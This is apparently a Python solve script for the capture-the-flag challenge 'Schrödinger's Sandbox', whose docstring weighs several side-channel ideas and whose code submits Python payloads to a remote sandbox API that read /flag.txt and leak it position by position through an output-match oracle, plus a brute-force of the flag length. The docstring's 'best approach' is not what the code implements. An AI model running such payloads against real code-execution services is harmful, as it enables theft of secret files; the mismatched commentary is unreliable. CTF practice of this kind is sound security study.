"""
Schrödinger's Sandbox - Approach 2: Character-by-character brute force

For each position in the flag, guess a character. If BOTH universes
have that character at that position, the output matches and we see it.

Since we know the flag starts with "0xfun{", we can verify the approach,
then brute-force the unknown characters inside the braces.

The key insight: if we guess WRONG, one universe matches and one doesn't,
so the outputs differ → we see nothing. If we guess RIGHT in both universes,
outputs match → but that means both flags have that char, which only helps
for the known prefix.

BETTER APPROACH: Use the ABSENCE of output as signal.
- For a given position and character, if we get output → both flags match at that position
- If no output → at least one flag differs

But we want the REAL flag, not what's common to both.

ACTUAL SOLUTION: Binary search with error/no-error side channel.
We can cause the program to CRASH based on a condition. If the program
crashes in one universe but not the other, the outputs differ (one has
output, one has an error) → we see nothing. If it crashes in BOTH or
NEITHER → outputs match.

BEST APPROACH: Bit-by-bit extraction via exit behavior.
"""

import requests
import string
import sys
import time

TARGET = "http://chall.0xfun.org:11102"

def try_char(pos, char):
    """
    Submit code that prints "1" if flag[pos] == char, else prints "0".

    If both universes have the same char at pos → outputs match → we see the result.
    If they differ → outputs don't match → we see nothing/error.

    So:
    - If we get "1" back → both flags have `char` at position `pos`
    - If we get "0" back → both flags DON'T have `char` at position `pos`
    - If we get nothing → the flags differ at this position (interesting!)
    """
    payload = f"""
flag = open("/flag.txt").read().strip()
if len(flag) > {pos}:
    print("1" if flag[{pos}] == {repr(char)} else "0")
else:
    print("X")
"""
    try:
        r = requests.post(
            f"{TARGET}/api/submit",
            json={"code": payload.strip()},
            timeout=10,
        )
        return r.text.strip()
    except:
        return None


def find_flag_length():
    """Find flag length by checking if both flags have the same length."""
    for length in range(10, 100):
        payload = f"""
flag = open("/flag.txt").read().strip()
print(len(flag))
"""
        try:
            r = requests.post(
                f"{TARGET}/api/submit",
                json={"code": payload.strip()},
                timeout=10,
            )
            resp = r.text.strip()
            print(f"[*] Length response: {resp}")
            if resp and resp.isdigit():
                return int(resp)
            else:
                print("[!] Flags have different lengths, can't directly get length")
                break
        except Exception as e:
            print(f"[!] Error: {e}")
            break

    # Binary search for length
    for length in range(10, 100):
        payload = f"""
flag = open("/flag.txt").read().strip()
if len(flag) >= {length}:
    print("Y")
else:
    print("N")
"""
        try:
            r = requests.post(
                f"{TARGET}/api/submit",
                json={"code": payload.strip()},
                timeout=10,
            )
            resp = r.text.strip()
            if resp == "N":
                print(f"[*] Flag length < {length}")
                return length - 1
            elif resp == "Y":
                print(f"[*] Flag length >= {length}")
            else:
                print(f"[*] Length {length}: no match (flags differ in length here)")
        except:
            pass
    return None


def extract_flag():
    charset = string.printable.strip()

    print("[*] Step 1: Try to get flag length")
    length = find_flag_length()
    print(f"[*] Detected length: {length}")

    if not length:
        length = 50  # guess

    print(f"\n[*] Step 2: Brute-force characters (length={length})")
    flag = ""

    for pos in range(length):
        found = False
        for char in charset:
            result = try_char(pos, char)
            if result is None:
                continue

            # If we got "1", both universes agree this char is at this position
            if "1" in result:
                flag += char
                print(f"[+] Position {pos}: '{char}' (common to both)")
                found = True
                break
            elif "0" in result:
                continue  # Both agree it's NOT this char
            else:
                # No output → flags differ at this position for this char
                # This means one has it and one doesn't
                pass

        if not found:
            # The flags differ at this position - we need another approach
            flag += "?"
            print(f"[?] Position {pos}: flags differ here")

        time.sleep(0.1)

    print(f"\n[*] Extracted (common chars): {flag}")
    return flag


if __name__ == "__main__":
    extract_flag()
